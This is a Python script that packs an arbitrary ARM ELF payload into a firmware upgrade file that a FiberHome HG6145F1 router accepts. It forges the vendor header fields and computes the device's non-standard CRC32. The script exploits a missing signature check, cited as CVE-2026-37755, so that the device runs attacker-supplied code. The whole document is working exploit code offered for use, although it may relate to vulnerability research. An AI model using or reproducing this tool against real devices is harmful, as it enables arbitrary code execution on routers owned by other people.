#!/usr/bin/env python3
"""
FiberHome HG6145F1 firmware packer
Builds a valid .bin upgrade file from an ARM ELF payload.

Header format reverse-engineered from libLedState.so (handler_head / file_verify).
The device only validates: ATOS magic, HW/SW compatibility, and CRC32 (init=0).
No cryptographic signature — that's CVE-2026-37755.

Usage:
    python3 pack_firmware.py <payload.elf> <output.bin>
"""
import struct
import sys

HEADER_SIZE = 0xE00  # 3584 bytes

MAGIC       = b"~@$^*)+ATOS!#%&("
HW_VERSION  = b"WKE2.094.445A01"
HW_COMPAT   = b"WKE2.094.424A01"
SW_BASE     = b"RX.XX.01.01"
SW_VERSION  = b"RP4423"
CHIP_TYPE   = b"BCM6855X"
AUTHOR      = b"\x41\x00\x44\x00\x45\x00\x4c"  # "A.D.E.L" wide chars
DATE        = b"01.03.2026"
SECTION     = b"patch_script"


def custom_crc32(data):
    """CRC32 with init=0 (not standard 0xFFFFFFFF). From libLedState.so file_verify()."""
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
        table.append(crc)
    crc = 0
    for byte in data:
        crc = table[(byte ^ crc) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF


def write_at(buf, offset, data):
    buf[offset:offset + len(data)] = data


def build_header(payload_size):
    hdr = bytearray(HEADER_SIZE)

    # 0x000 - hardware versions (handler_head checks these for compatibility)
    write_at(hdr, 0x000, HW_VERSION)
    write_at(hdr, 0x010, HW_COMPAT)
    write_at(hdr, 0x020, HW_VERSION)

    # 0x044 - software versions
    write_at(hdr, 0x044, SW_BASE)
    write_at(hdr, 0x053, SW_VERSION)

    # 0x05a - undocumented 8 bytes (present in all valid firmware images, not checked by handler_head)
    write_at(hdr, 0x05a, bytes.fromhex("2bf8642403e0aec8"))

    # 0x093 - author (wide chars) and build date
    write_at(hdr, 0x093, AUTHOR)
    write_at(hdr, 0x0a1, DATE)

    # 0x100 - ATOS magic (handler_head validates this exact string)
    write_at(hdr, 0x100, MAGIC)

    # 0x110 - HW/SW version copies
    write_at(hdr, 0x110, HW_VERSION)
    write_at(hdr, 0x130, SW_VERSION)

    # 0x166 - CRC32 placeholder (filled by caller)

    # 0x170 - undocumented 2 bytes + chip type
    write_at(hdr, 0x170, bytes.fromhex("adc8"))
    write_at(hdr, 0x172, CHIP_TYPE)

    # 0x1f0 - section table
    write_at(hdr, 0x1f0, b"1")                              # section count
    write_at(hdr, 0x200, SECTION)                            # section name
    write_at(hdr, 0x220, str(payload_size).encode())         # section size (ASCII)

    return hdr


def pack(payload_path, output_path):
    with open(payload_path, "rb") as f:
        payload = f.read()

    hdr = build_header(len(payload))

    crc = custom_crc32(payload)
    struct.pack_into("<I", hdr, 0x166, crc)

    with open(output_path, "wb") as f:
        f.write(hdr)
        f.write(payload)

    print(f"Payload:  {len(payload)} bytes")
    print(f"CRC32:    0x{crc:08X}")
    print(f"Output:   {output_path} ({HEADER_SIZE + len(payload)} bytes)")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <payload.elf> <output.bin>")
        print()
        print("Builds a FiberHome HG6145F1 firmware upgrade .bin file.")
        print("The payload should be an ARM ELF binary (cross-compiled with gcc-arm-linux-gnueabi).")
        print("The device executes it directly after CRC validation — no signature check.")
        sys.exit(1)
    pack(sys.argv[1], sys.argv[2])
